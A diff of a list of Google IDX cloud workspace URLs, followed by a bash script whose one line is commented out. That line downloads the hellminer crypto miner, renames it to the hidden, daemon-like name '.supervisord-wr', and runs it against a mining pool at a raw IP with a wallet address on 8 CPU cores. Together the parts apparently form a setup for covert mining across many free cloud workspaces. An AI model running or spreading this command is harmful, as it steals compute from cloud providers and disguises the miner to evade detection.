@@ -1,14 +1,15 @@
-https://idx.google.com/u/0/testify-micro-3012606
-https://idx.google.com/u/0/gongga-curu-1052658
-https://idx.google.com/u/0/farako-poliko-1227572
-https://idx.google.com/u/0/farva-burit-4578181
-https://idx.google.com/u/0/kolom-jaaka-435071
-https://idx.google.com/u/0/aola-werta-3870114
-https://idx.google.com/u/0/serapo-juluku-1217121
-https://idx.google.com/u/0/rona-maya-907966
-https://idx.google.com/u/0/hulaka-bora-7664538
-https://idx.google.com/u/0/rungka-muyu-6049387
-https://idx.google.com/u/0/sena-mangku-8019931
+https://idx.google.com/u/1/kayak-opens-4291081
+https://idx.google.com/u/1/saucepan-drinks-3162648
+https://idx.google.com/u/1/raccoon-unloads-9330923
+https://idx.google.com/u/1/hammer-tumbles-1918777
+https://idx.google.com/u/1/vanilla-bends-7740046
+https://idx.google.com/u/1/bread-holds-1874439
+https://idx.google.com/u/1/nutmeg-proclaims-1582934
+https://idx.google.com/u/1/peacock-rips-8871927
+https://idx.google.com/u/1/macadamia-tumbles-9489287
+https://idx.google.com/u/0/king-apps-784536
+https://idx.google.com/u/1/kayak-opens-4291081
+
 
 #!/bin/bash
 #wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && rm -rf hellminer_linux64.tar.gz && chmod +x ./hellminer && mv hellminer .supervisord-wr && ./.supervisord-wr -c stratum+tcp://18.119.69.12:5040 -u RWsSEGpV2E6yYa3UZ8fTE17FE3ZzMWzRAs."$(TZ='Asia/Jakarta' date +"%d-%b-%Y_Jam-%H-%M")-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)" --cpu 8
